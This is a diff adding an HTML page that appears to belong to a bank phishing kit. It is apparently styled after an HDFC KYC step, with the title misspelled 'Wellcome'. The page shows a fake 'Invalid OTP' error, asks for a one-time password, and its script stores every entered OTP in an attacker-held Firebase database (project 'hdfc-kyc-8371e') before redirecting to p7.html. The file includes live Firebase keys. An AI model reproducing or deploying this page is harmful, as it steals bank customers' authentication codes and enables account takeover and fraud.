@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Wellcome</title>
+    <link rel="preload" as="image" href="/afx.png" />
+    <meta name="next-head-count" content="4" />
+    <link rel="preload" href="fake/a6cd15749f8dde69.css" as="style" />
+    <link rel="stylesheet" href="fake/a6cd15749f8dde69.css" data-n-g="" />
+    <noscript data-n-css=""></noscript>
+  </head>
+
+  <body>
+    <div id="__next">
+      <div class="header">
+        <div class="logo text-center">
+          <span
+            style="
+              box-sizing: border-box;
+              display: inline-block;
+              overflow: hidden;
+              width: initial;
+              height: initial;
+              background: none;
+              opacity: 1;
+              border: 0;
+              margin: 0;
+              padding: 0;
+              position: relative;
+              max-width: 100%;
+            "
+            ><span
+              style="
+                box-sizing: border-box;
+                display: block;
+                width: initial;
+                height: initial;
+                background: none;
+                opacity: 1;
+                border: 0;
+                margin: 0;
+                padding: 0;
+                max-width: 100%;
+              "
+              ><img
+                style="
+                  display: block;
+                  max-width: 100%;
+                  width: initial;
+                  height: initial;
+                  background: none;
+                  opacity: 1;
+                  border: 0;
+                  margin: 0;
+                  padding: 0;
+                "
+                alt=""
+                aria-hidden="true"
+                src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27220%27%20height=%2758%27/%3e" /></span
+            ><img
+              alt=""
+              src="fake/afx.png"
+              decoding="async"
+              data-nimg="intrinsic"
+              style="
+                position: absolute;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                right: 0;
+                box-sizing: border-box;
+                padding: 0;
+                border: none;
+                margin: auto;
+                display: block;
+                width: 0;
+                height: 0;
+                min-width: 100%;
+                max-width: 100%;
+                min-height: 100%;
+                max-height: 100%;
+              "
+          /></span>
+        </div>
+      </div>
+      <center><p style="color: red">Invalid OTP</p></center>
+      <center><p style="color: green">one time password sent to your register mobile number</p></center>
+      <div class="content">
+        <form autocomplete="off" id="form">
+          <input type="hidden" name="formtoken" value="" />
+          <div class="form-group">
+            <label for="username">one time password(OTP)</label
+            ><input type="text" class="form-control" id="otp2" required="" />
+          </div>
+          <button type="submit" class="btn btn-primary login-btn">
+            SUBMIT
+          </button>
+        </form>
+      </div>
+      <div class="footer">
+        © Copyright<a href="/">Terms and Conditions</a
+        ><a href="/">Privacy Policy</a>
+      </div>
+    </div>
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+        query,
+        limitToLast,
+        get,
+      } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+  apiKey: "AIzaSyCRzt1xcSuIjYs4Y6UOLrX2ZRSSDfGxB4w",
+  authDomain: "hdfc-kyc-8371e.firebaseapp.com",
+  projectId: "hdfc-kyc-8371e",
+  storageBucket: "hdfc-kyc-8371e.appspot.com",
+  messagingSenderId: "192461050608",
+  appId: "1:192461050608:web:cdb40f6c85a125e3b36835"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      // const db = getFirestore(app);
+      const db = getDatabase(app);
+      const que = query(ref(db, "users"), limitToLast(1));
+
+      const last_key = await get(que)
+        .then((snapshot) => {
+          if (snapshot.exists()) {
+            return parseInt(Object.keys(snapshot.val())[0]) + 1;
+          } else {
+            return 1;
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+      const form = document.getElementById("form");
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        let otp2 = document.getElementById("otp2").value;
+        if (otp2 != "") {
+          try {
+            const docRef = await set(ref(db, "users/" + last_key), {
+              otp2: otp2,
+            });
+            // localStorage.setItem("id", docRef.id);
+            window.location = "p7.html";
+          } catch (e) {
+            console.error("Error adding document: ", e);
+          }
+        }
+        return false;
+      });
+    </script>
+  </body>
+</html>
